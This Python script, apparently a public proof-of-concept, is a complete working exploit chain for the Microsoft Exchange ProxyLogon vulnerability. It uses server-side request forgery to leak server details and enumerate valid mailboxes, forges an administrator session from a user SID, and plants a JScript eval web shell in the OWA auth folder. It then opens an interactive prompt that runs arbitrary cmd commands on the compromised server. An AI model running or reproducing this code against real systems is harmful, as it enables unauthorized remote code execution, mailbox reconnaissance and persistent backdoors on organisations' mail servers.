'''
Author: Udyz
Reference:
- https://gist.github.com/testanull/1QDNWjJdBnNp8JNuQFhRWeQXL3fDb84cVS
- https://raw.githubusercontent.com/microsoft/CSS-Exchange/main/Security/http-vuln-cve2021-26855.nse
- https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-26855.yaml
- https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/
- https://proxylogon.com
[*] ProxyLogon Exploit
'''
# -*- coding: utf-8 -*-
import requests
s = requests.Session()
import string
import random
import sys
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import os
import tldextract
def id_generator(size=10, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))
random_name = id_generator()
shell_name = "%s.aspx"%(random_name)
shell_content = '<script language="JScript" runat="server"> function Page_Load(){/**/eval(Request["%s"],"unsafe");}</script>'%(random_name)
shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\%s" %(shell_name)
shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
def proxylogon(url, mail, fqdn, sid):
	path_maybe_vuln = '/ecp/pentest.js'
	server_name = fqdn
	print('(+) Mail = %s '%(mail))
	xx = sid.split('-')
	s1 = xx[0]
	s2 = xx[1]
	s3 = xx[2]
	s4 = xx[3]
	s5 = xx[4]
	s6 = xx[5]
	s7 = xx[6]
	s8 = xx[7]
	fix_sid = '%s-%s-%s-%s-%s-%s-%s-500'%(s1,s2,s3,s4,s5,s6,s7)
	print("(+) Fixed SID = %s"%(fix_sid))
	proxyLogon_body = """<r at="Negotiate" ln="%s"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>
	""" %(mail.split('@')[0],fix_sid)
	proxyLogon_headers = {
		"Cookie": "X-BEResource=Admin@{FQDN}:444/ecp/proxyLogon.ecp/#?a=~1942062522;".format(FQDN=server_name),
		"Content-Type": "text/xml",
		"User-Agent": user_agent
	}
	proxyLogon_req = s.post("%s/%s"%(url, path_maybe_vuln), headers=proxyLogon_headers, data=proxyLogon_body, verify=False, proxies={'http':'127.0.0.1:8080'})
	if proxyLogon_req.status_code == 241 and "msExchEcpCanary=" in proxyLogon_req.headers["Set-Cookie"]:
		sessid = proxyLogon_req.headers["set-cookie"].split("ASP.NET_SessionId=")[1].split(";")[0]
		msExchEcpCanary = proxyLogon_req.headers['set-cookie'].split("msExchEcpCanary=")[1].split(";")[0]
		print('(+) Login Success!')
		print('(+) Cookie =  ASP.NET_SessionId=%s' %(proxyLogon_req.headers["Set-Cookie"].split('ASP.NET_SessionId=')[1]))
		getOAB_req = s.post('%s/%s'%(url,path_maybe_vuln), headers={
			    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
			        server_name, msExchEcpCanary, sessid, msExchEcpCanary),
			    "Content-Type": "application/json; charset=utf-8",
			    "User-Agent": user_agent
			},
           json={"filter": {
               "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                              "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}},
           verify=False
           )
		if getOAB_req.status_code != 200:
			print('(-) Got OAB Id Error! [%s]'%getOAB_req.status_code)
			exit()
		oabId = getOAB_req.text.split('"RawIdentity":"')[1].split('"')[0]
		print('(+) Leaked OAB Id = %s'%oabId)
		oab_json = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
		"properties": {
		"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
		"ExternalUrl": "http://ffff/#%s" % shell_content}}}
		oab_req = s.post("%s/%s" %(url, path_maybe_vuln), headers={
		    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
		        server_name, msExchEcpCanary, sessid, msExchEcpCanary),
		    "Content-Type": "application/json; charset=utf-8",
		    "User-Agent": user_agent
		},
           json=oab_json,
           verify=False
           )
		if oab_req.status_code == 200:
			print('(+) Preparing payload!')
			reset_oab_body = {"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
              "properties": {
                  "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
                                 "FilePathName": shell_absolute_path}}}
			reset_oab_req = s.post("%s/%s" %(url, path_maybe_vuln), headers={
		    "Cookie": "X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s" % (
		        server_name, msExchEcpCanary, sessid, msExchEcpCanary),
		    "Content-Type": "application/json; charset=utf-8",
		    "User-Agent": user_agent
		},
           json=reset_oab_body,
           verify=False
           )
			if reset_oab_req.status_code == 200:
				#print('(+) Reset OAB Success! [%s]'%(reset_oab_req.status_code))
				print('(+) Webshell drop at %s/owa/auth/%s .. Have fun!'%(url, shell_name))
				with open('shell.txt', 'a+') as f:
					f.write('%s/owa/auth/%s|%s'%(url, shell_name, random_name))
				while True:
					cmd = input('CMD: ')
					shell_body_exec = '''%s=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c %s").stdout.readall());'''%(random_name,cmd)
					shell_req = requests.post('%s/owa/auth/%s'%(url, shell_name),headers={'Content-Type': 'application/x-www-form-urlencoded'},data=shell_body_exec,verify=False)
					if shell_req.status_code == 200:
						print(shell_req.text.split('Name                            :')[0])
					elif cmd == 'exit':
						exit()
					else:
						print('(-) WHAT!!!!!!!!!!!!!!!')
			else:
				print('(-) Reset OAB Error! [%s]'%reset_oab_req.status_code)

		else:
			print('(-) Set external url Error! [%s]'%oab_req.status_code)
	else:
		print("(-) Proxylogon Error! [%s]"%proxyLogon_req.status_code)
def exploit(url):
	try:
		print('[*] Target: %s'%url)
		server = url + '/owa/auth.owa'
		s = requests.Session()
		req = s.post(server, verify=False)
		if not req.status_code == 400:
			print('[-] Cant get FQDN!')
			exit(0)
		server_name = req.headers["X-FEServer"]
		print('(*) Getting FQDN Name: %s'%(server_name))
		path_maybe_vuln = '/ecp/ssrf.js'
		headers = {
		'User-Agent': 'Hello-World',
		'Cookie': 'X-BEResource={FQDN}/EWS/Exchange.asmx?a=~1942062522;'.format(FQDN=server_name),
		'Connection': 'close',
		'Content-Type': 'text/xml',
		'Accept-Encoding': 'gzip'
		}
		payload = """<?xml version="1.0" encoding="utf-8"?>
					<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
					xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
					xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
					xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
					    <soap:Body>
					        <m:GetFolder>
					            <m:FolderShape>
					                <t:BaseShape>Default</t:BaseShape>
					            </m:FolderShape>
					            <m:FolderIds>
					                <t:DistinguishedFolderId Id="inbox">
					                    <t:Mailbox>
					                        <t:EmailAddress>admin@domain.tld</t:EmailAddress>
					                    </t:Mailbox>
					                </t:DistinguishedFolderId>
					            </m:FolderIds>
					        </m:GetFolder>
					    </soap:Body>
					</soap:Envelope>
		"""
		reqs = s.post('%s/%s' %(url,path_maybe_vuln),headers=headers,data=payload, verify=False)
		if reqs.status_code == 200:
			print('(+) Target is Vuln to SSRF [CVE-2021-26855]!')
			print('(*) Getting Information Server')
			print('(+) Computer Name = %s'%reqs.headers["X-DiagInfo"])
			print('(+) Domain Name = %s'%reqs.headers["X-CalculatedBETarget"].split(',')[1])
			print('(+) Guest SID = %s'%reqs.headers["Set-Cookie"].split('X-BackEndCookie=')[1].split(';')[0])
			print('(*) Find valid mail from users list')
			u_m = reqs.headers["X-CalculatedBETarget"].split(',')[1]
			f = open('users.txt').read().splitlines()
			print('+ %s' %reqs.headers["X-CalculatedBETarget"].split(',')[1])
			X = input('(+) Put Domain Server without Subdomain: ')
			for u in f:
				domainstr = tldextract.extract(u_m)
				domain = "{}.{}".format(domainstr.domain, domainstr.suffix)
				user = u
				if ('local' in u_m):
					domain = '%s.local'%reqs.headers["X-CalculatedBETarget"].split(',')[1].split('.')[1]
				elif X == '':
					domainstr = tldextract.extract(u_m)
					domain = "{}.{}".format(domainstr.domain, domainstr.suffix)
				else:
					domain = X
				mail = '{user}@{domain}'.format(user=user, domain=domain)
				mailnum = '''<?xml version="1.0" encoding="utf-8"?>
					<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
					xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
					xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
					xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
					    <soap:Body>
					        <m:GetFolder>
					            <m:FolderShape>
					                <t:BaseShape>Default</t:BaseShape>
					            </m:FolderShape>
					            <m:FolderIds>
					                <t:DistinguishedFolderId Id="inbox">
					                    <t:Mailbox>
					                        <t:EmailAddress>{mail}</t:EmailAddress>
					                    </t:Mailbox>
					                </t:DistinguishedFolderId>
					            </m:FolderIds>
					        </m:GetFolder>
					    </soap:Body>
					</soap:Envelope>
				'''.format(mail=mail)
				mail_valid = ''
				reqx = s.post('%s/%s' %(url,path_maybe_vuln),headers=headers,data=mailnum, verify=False)
				if '<m:ResponseCode>NoError</m:ResponseCode>' in reqx.text:
					xmlstr = """{data}""".format(data=reqx.text)
					total_count = re.findall('(?:<t:TotalCount>)(.+?)(?:</t:TotalCount>)', xmlstr)
					print('-'*35)
					print('(+) %s | Total Inbox = %s'%(mail,total_count[0]))
					mail_valid = mail
				elif 'Access is denied. Check credentials and try again' in reqx.text:
					print('-'*35)
					print('(+) %s | Valid Mail!'%(mail))
					mail_valid = mail
				#else:
					#print('(-) %s | Invalid mail'%(mail))
				headers_for_audio = {
				"User-Agent": "Hello-World",
				"Cookie": "X-BEResource={FQDN}/autodiscover/autodiscover.xml?a=~1942062522;".format(FQDN=server_name),
				"Connection": "close",
				"Content-Type": "text/xml"
				}
				autodiscover_payload = '''
				<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
			    <Request>
			      <EMailAddress>{mail}</EMailAddress>
			      <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
			    </Request>
			</Autodiscover>
				'''.format(mail=mail_valid)
				r3q = s.post('%s/%s'%(url,path_maybe_vuln), headers=headers_for_audio, data=autodiscover_payload, verify=False)
				if 'DisplayName' in r3q.text:
					txtstr = """%s"""%(r3q.text)
					display_name = re.findall('(?:<DisplayName>)(.+?)(?:</DisplayName>)', txtstr)
					legacyDN = re.findall('(?:<LegacyDN>)(.+?)(?:</LegacyDN>)', txtstr)
					server = r3q.text.split('<Server>')[1].split('</Server>')[0]
					print('(+) Server = %s'%server)
					groupname = re.findall('(?:<GroupingInformation>)(.+?)(?:</GroupingInformation>)', txtstr)
					mapi_body = legacyDN[0] + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
					mapireq = requests.post("%s/%s" % (url,path_maybe_vuln), headers={
					    "Cookie": "X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=%s&a=~1942062522;" %(server_name, server),
					    "Content-Type": "application/mapi-http",
					    "X-Requesttype": "Connect",
					    "X-Clientinfo": "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}",
					    "X-Clientapplication": "Outlook/15.0.4815.1002",
					    "X-Requestid": "{C715155F-2BE8-44E0-BD34-2960067874C8}:500",
					    "User-Agent": "Hello-World"
						},
					    data=mapi_body,
					    verify=False
					)
					try:
						if mapireq.status_code != 200 or "act as owner of a UserMailbox" not in mapireq.text:
							print('(+) Display Name = %s' %display_name[0])
							print('(+) Group Name = %s'%groupname[0])
							print('(+) Group Member = %s'%legacyDN[0].split('/ou=')[1].split('/cn=')[0])
							print('-'*35)
						else:
							sid = mapireq.text.split("with SID ")[1].split(" and MasterAccountSid")[0]
							print('(+) Display Name = %s' %display_name[0])
							print('(+) Group Name = %s'%groupname[0])
							print('(+) Group Member = %s'%legacyDN[0].split('/ou=')[1].split('/cn=')[0])
							print('(+) User SID = %s'%sid)
							print('-'*35)
					except IndexError:
							print('(+) Display Name = %s' %display_name[0])
							print('(+) Group Name = %s'%groupname[0])
							print('(+) Group Member = %s'%legacyDN[0].split('/ou=')[1].split('/cn=')[0])
							print('-'*35)
					print('(*) Tested ProxyLogon!')
					proxylogon(url, mail_valid, server_name, sid)
					exit(0)
			exit(0)
		else:
			print('(-) Target is not Vuln to SSRF [CVE-2021-26855]!')
	#except Exception as e:
		#print(e)
		#pass
	except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
		print(e)
		pass
if(len(sys.argv) < 2):
	print('[*] ProxyLogon Pre-Auth RCE\n./%s <https://url>\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n'%(sys.argv[0]))
	exit(0)
exploit(sys.argv[1])